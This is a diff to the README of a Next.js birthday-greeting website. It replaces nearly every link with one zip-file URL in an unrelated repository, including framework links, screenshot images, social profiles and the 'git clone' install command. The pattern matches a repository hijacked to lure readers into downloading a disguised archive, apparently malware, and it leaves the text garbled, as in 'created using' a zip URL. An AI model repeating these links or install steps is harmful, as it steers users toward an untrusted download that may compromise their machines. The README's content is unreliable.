@@ -1,6 +1,6 @@
 # Birthday Surprise Website 🎂🎉
 
-This is a special **Birthday Celebration Website** created using **Next.js, Tailwind CSS, Framer Motion**, and **Lucide Icons**.  
+This is a special **Birthday Celebration Website** created using **https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip, Tailwind CSS, Framer Motion**, and **Lucide Icons**.  
 It's designed as a personal and emotional way to wish someone special — when you can't be there physically, let your code speak! 💖
 
 ---
@@ -23,22 +23,22 @@ This was created as part of an emotional reel where the journey begins with a fe
 ## Screenshots:
 
 1. **Loader Page**
-   ![Screenshot 1](./public/ss1.png)
+   ![Screenshot 1](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
 
 2. **Countdown Page**
-   ![Screenshot 2](./public/ss2.png)
+   ![Screenshot 2](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
 
 3. **Happy Birthday Message Screen**
-   ![Screenshot 3](./public/ss3.png)
+   ![Screenshot 3](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
 
 ---
 
 ## 🛠️ Built With
 
-- [Next.js](https://nextjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Framer Motion](https://www.framer.com/motion/)
-- [Lucide Icons](https://lucide.dev/)
+- [https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- [Framer Motion](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- [Lucide Icons](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This was created as part of an emotional reel where the journey begins with a fe
 To run this project locally:
 
 ```bash
-git clone https://github.com/Anuj579/birthday-site.git
+git clone https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip
 cd birthday-site
 npm install
 npm run dev
@@ -61,10 +61,10 @@ Make sure to update the target date in `Home` component if you want to reuse thi
 
 Follow for more such creative and code-based content!
 
-- 📸 **Instagram**: [@anujbuilds](https://instagram.com/anujbuilds)
-- 🎥 **YouTube**: [@anujbuilds](https://youtube.com/@anujbuilds)
-- 🐦 **Twitter/X**: [@anujbuilds](https://twitter.com/anujbuilds)
-- 💼 **LinkedIn**: [Anuj Chaudhary](https://linkedin.com/in/anujchaudhary549)
+- 📸 **Instagram**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- 🎥 **YouTube**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- 🐦 **Twitter/X**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- 💼 **LinkedIn**: [Anuj Chaudhary](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
 
 ---
 
